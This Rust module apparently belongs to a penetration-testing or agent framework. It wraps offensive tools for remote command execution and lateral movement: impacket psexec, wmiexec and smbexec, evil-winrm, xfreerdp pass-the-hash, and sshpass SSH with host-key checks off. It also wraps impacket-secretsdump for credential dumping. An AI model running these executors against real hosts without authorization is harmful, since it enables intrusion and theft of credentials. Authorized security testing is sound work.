//! Remote execution tool executors (psexec, wmiexec, smbexec, evil-winrm,
//! xfreerdp, ssh, secretsdump_kerberos).

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_i64, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Execute a command on a remote host via impacket-psexec.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`, `command`
pub async fn psexec(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");
    let command =
        optional_str(args, "command").unwrap_or(r#"cmd.exe /c "whoami && hostname && ipconfig""#);

    let (auth_str, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-psexec")
        .arg(&auth_str)
        .args(extra_args)
        .arg(command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-psexec with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `command`
pub async fn psexec_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let command =
        optional_str(args, "command").unwrap_or(r#"cmd.exe /c "whoami && hostname && ipconfig""#);

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    CommandBuilder::new("impacket-psexec")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .arg(command)
        .env(env_key, env_val)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-wmiexec.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`, `command`
pub async fn wmiexec(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");
    let command = optional_str(args, "command").unwrap_or("whoami");

    let (auth_str, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-wmiexec")
        .arg(&auth_str)
        .args(extra_args)
        .arg(command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-wmiexec with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `command`
pub async fn wmiexec_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let command = optional_str(args, "command").unwrap_or("whoami");

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    CommandBuilder::new("impacket-wmiexec")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .arg(command)
        .env(env_key, env_val)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-smbexec.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`, `command`
pub async fn smbexec(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");
    let command = optional_str(args, "command").unwrap_or("whoami");

    let (auth_str, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-smbexec")
        .arg(&auth_str)
        .args(extra_args)
        .flag("-c", command)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via impacket-smbexec with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `command`
pub async fn smbexec_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let command = optional_str(args, "command").unwrap_or("whoami");

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    CommandBuilder::new("impacket-smbexec")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .flag("-c", command)
        .env(env_key, env_val)
        .timeout_secs(120)
        .execute()
        .await
}

/// Execute a command on a remote host via evil-winrm.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `command`
pub async fn evil_winrm(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let command = optional_str(args, "command").unwrap_or("whoami && hostname && ipconfig");

    let mut cmd = CommandBuilder::new("evil-winrm")
        .flag("-i", target)
        .flag("-u", username);

    cmd = match hash {
        Some(h) => cmd.flag("-H", h),
        None => match password {
            Some(p) => cmd.flag("-p", p),
            None => cmd,
        },
    };

    cmd.flag("-c", command).timeout_secs(120).execute().await
}

/// Test RDP authentication via xfreerdp.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `hash`, `domain`
pub async fn xfreerdp(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("xfreerdp")
        .arg(format!("/v:{target}"))
        .arg(format!("/u:{username}"));

    cmd = match hash {
        Some(h) => cmd.arg(format!("/pth:{h}")),
        None => match password {
            Some(p) => cmd.arg(format!("/p:{p}")),
            None => cmd,
        },
    };

    if let Some(d) = domain {
        cmd = cmd.arg(format!("/d:{d}"));
    }

    cmd.arg("/cert-ignore")
        .arg("+auth-only")
        .timeout_secs(30)
        .execute()
        .await
}

/// Execute a command on a remote host via SSH with password authentication.
///
/// Required args: `target`, `username`, `password`
/// Optional args: `port`, `command`
pub async fn ssh_with_password(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let port = optional_str(args, "port");
    let command = optional_str(args, "command").unwrap_or("whoami && hostname");

    let user_host = format!("{username}@{target}");

    let mut cmd = CommandBuilder::new("sshpass")
        .flag("-p", password)
        .arg("ssh")
        .arg("-o")
        .arg("StrictHostKeyChecking=no")
        .arg(&user_host);

    if let Some(p) = port {
        cmd = cmd.flag("-p", p);
    }

    cmd.arg(command).timeout_secs(120).execute().await
}

/// Dump secrets from a remote host via impacket-secretsdump with Kerberos auth.
///
/// Required args: `target`, `username`, `domain`, `ticket_path`
/// Optional args: `dc_ip`, `target_ip`, `timeout_minutes`
pub async fn secretsdump_kerberos(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let ticket_path = required_str(args, "ticket_path")?;
    let dc_ip = optional_str(args, "dc_ip");
    let target_ip = optional_str(args, "target_ip");
    let timeout_minutes = optional_i64(args, "timeout_minutes").unwrap_or(3);
    let timeout_secs = (timeout_minutes * 60) as u64;

    let target_str = format!("{domain}/{username}@{target}");
    let (env_key, env_val) = credentials::kerberos_env(ticket_path);

    CommandBuilder::new("impacket-secretsdump")
        .arg("-k")
        .arg("-no-pass")
        .arg(&target_str)
        .flag_opt("-dc-ip", dc_ip)
        .flag_opt("-target-ip", target_ip)
        .env(env_key, env_val)
        .timeout_secs(timeout_secs)
        .execute()
        .await
}
